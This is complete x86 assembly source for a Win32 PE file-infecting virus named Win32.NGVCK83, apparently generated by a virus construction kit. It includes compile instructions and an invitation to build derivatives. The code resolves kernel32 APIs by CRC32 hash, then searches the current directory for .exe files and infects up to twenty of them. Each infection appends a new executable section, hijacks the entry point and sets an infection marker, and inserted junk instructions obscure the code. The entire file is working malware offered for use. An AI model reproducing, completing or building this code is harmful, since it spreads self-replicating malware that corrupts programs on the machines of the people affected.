              
;
;
; Win32.NGVCK83 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK83
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h




                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 pop dword ptr [ebp+NTableTemp]
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
                                        ; mov eax, ebx
 mov eax, ebx
                                        ; mov edi, ebx
 mov edi, ebx
 push edi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop ebx
 sub ebx, dword ptr [edx]
 test ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 push dword ptr [ebp+TempApisearch3]
 pop edx
 mov eax, dword ptr [ebp+NTableTemp]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, ecx
                                        ; clear eax
 mov eax, -57503d
 add eax, 57503d
 mov ax, word ptr [ecx]
 mov dword ptr [ebp+Trash1], 1027672    ; Trash
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [eax]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, eax
 xor ecx, edx                           ; Trash

 push eax
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d xor 7d )
 xor ecx, 7d
 mov edx, offset WFD_szFileName
 add edx, ebp


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 inc edx
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg eax, ebx

 push eax
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edi


                                        ; round to pages
 mov si, 0h
                                        ; add esi, 1
 inc esi
GetKernelLoop:
                                        ; clear ecx
 push 0
 pop ecx
 add esi, -1
 mov cx, word ptr [esi+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+ecx+34h]
 jnz GetKernelLoop
 push esi
 pop dword ptr [ebp+KernelMZ]
                                        ; add esi, 60
 add esi, 60d
 mov edx, [esi]
 add esi, -60d
 add edx, esi
 mov [KernelPE+ebp], edx

 lea ecx, [ebp+GetApis]
 xchg ebx, ecx

 push ebx
ret

;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 xor ebx, ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 mov ebx, 80000000h or 40000000h
 push ebx
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov ebx, -1
 mov ebx, ( -1d + 27d )
 sub ebx, 27d
 and ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear ecx
 and ecx, 0
 push ebx
 push ecx
 push ecx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 dec dword ptr [ebp+Trash1]             ; Trash
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 and edx, 0
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov eax, NumberOfApis
 adc ebx, 11325413d                     ; Trash
                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [edi+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add edx, 4
 add edx, 4d
                                        ; get NTableVA
 mov edi, dword ptr [edx]
                                        ; add edx, 4
 dec edx
 add edx, 5d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg ebx, edx

 mov edi, offset APIOffsets
 add edi, ebp


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 add edx, 4d
 mov ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], ecx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 sub eax, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop ecx
                                        ; retrieve PE - Header
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; get File Alignment
 mov eax, [edx+3Ch]
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], eax
                                        ; clear esi
 xor esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 add dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ecx
 mov edx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], edx
 mov ecx, [eax+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+Trash1], 616612     ; Trash
 add dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov edx, [eax+74h]
 shl edx, 3
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [eax+6h]
 mov ecx, 28h
 pushad
 mov eax, ebx
 mul ecx
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, edx
 add eax, ebx
 lea ecx, [ebp+newsection]
 xchg ecx, edx


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov ecx, [edx-5*8+8d]
 add ecx, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ecx
 push ebx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov ebx,[edx-5*8+20d]
 add ebx,[edx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 push ebx
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp+nsphysicaloffset], 0
 add dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
                                        ; clear eax
 mov eax, 1411d
 sub eax, 1411d
 add eax, dword ptr [ebp+filealign]
 mov ebx, ecx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 shl ecx, 8d                            ; Trash
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 add ecx, 93386753d                     ; Trash
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov edx, 16
 mov edx, 16d
 lea esi, [ebp+newsection]
 xchg eax, esi

 pop ebx
WriteNewSectionLoop:
 mov ecx, dword ptr [eax]
 mov dword ptr [ebx], ecx
 sub edx, 1
                                        ; add eax, 4
 inc eax
 add eax, 3d
                                        ; add ebx, 4
 add ebx, 4d
 test edx, edx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
 mov eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 0h
 add dword ptr [ecx+4Ch], 'NGVC'
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ecx
 mov ecx, -64917d
 add ecx, 64917d
 add ecx, dword ptr [ebp+InfCounter]
 dec ecx
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

 or ecx, eax                            ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 push ecx
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 Misc1       dd 0h
 OldEIP      dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 PEheader    dd 0h
 ATableVA    dd 0h
 MapHandle   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 sectionalign   dd 0h
 counter     dw 0h
 NewEIP      dd 0h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 068624A9Dh           ; CloseHandle
 dd 03C19E536h           ; SetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 08C892DDFh           ; CreateFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 096B2D96Ch           ; CreateFileMappingA

 KernelPE    dd 0h

 filealign   dd 0h
 InfCounter  dd 0h
 FindHandle  dd 0h
 KernelMZ    dd 0h
 NTableTemp  dd 0h
 OTableVA    dd 0h
 Attributes  dd 0h
 TempApisearch3 dd 0h
 filemask    db '*.eXe',0
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable


 APIOffsets:
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h

 NTableVA    dd 0h
 FileHandle  dd 0h
 TempAPI     dd 0h
 APICRC32    dd 0h
 AlignReg1   dd 0h
 db 'Virus : Win32.NGVCK83 Author : SnakeByte',0
 NewSize     dd 0h




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edx, edi
                                        ; clear edx
 mov edx, 65985d
 sub edx, 65985d
 add edx, edi
LenCRC:
                                        ; add edx, 1
 inc edx
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, edi
                                        ; mov esi, edx
                                        ; clear esi
 xor esi, esi
 add esi, edx
                                        ; add esi, 1
 add esi, 1d
 cld
                                        ; clear ecx
 mov ecx, 38731d
 sub ecx, 38731d
 dec ecx
                                        ; mov eax, ecx
 push ecx
 pop eax
NextByteCRC:
                                        ; clear edx
 push 0
 pop edx
                                        ; clear ebx
 push 0
 pop ebx
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor dl, cl
 mov cl, ch
 mov ch, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr bx, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor bx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor ecx, edx
 xor eax, ebx
 dec esi
jnz NextByteCRC
 not eax
 not ecx
 mov edx, eax
 rol edx, 16d
 mov dx, cx
 mov dword ptr [ebp+APICRC32], 0
 xor dword ptr [ebp+APICRC32], edx
 popad
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea esi, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+InfCounter]
 test edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear esi
 mov esi, 1148d
 sub esi, 1148d
 xor esi, dword ptr [ebp+FindHandle]
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xor dword ptr [ebp+Trash1], ebx        ; Trash
 xchg ebx, edx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 lea ecx, [ebp+WFD_nFileSizeLow]
 xchg ecx, edx

 cmp dword ptr [edx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 sub edx, 'ZM'
 jz Goodfile
                                        ; mov ebx, 20318
 mov ebx, ( 20318d - 39d )
 add ebx, 39d
 cmp ebx, 0
 jne Notagoodfile
Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [eax+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ebx
 mov ebx, 20146d
 sub ebx, 20146d
 add ebx, dword ptr [ebp+Attributes]
 push ebx
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 adc dword ptr [ebp+Trash1], 224433     ; Trash

NoInfection:
ret




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, 0
 push ecx
 call ExitProcess



end FakeCode

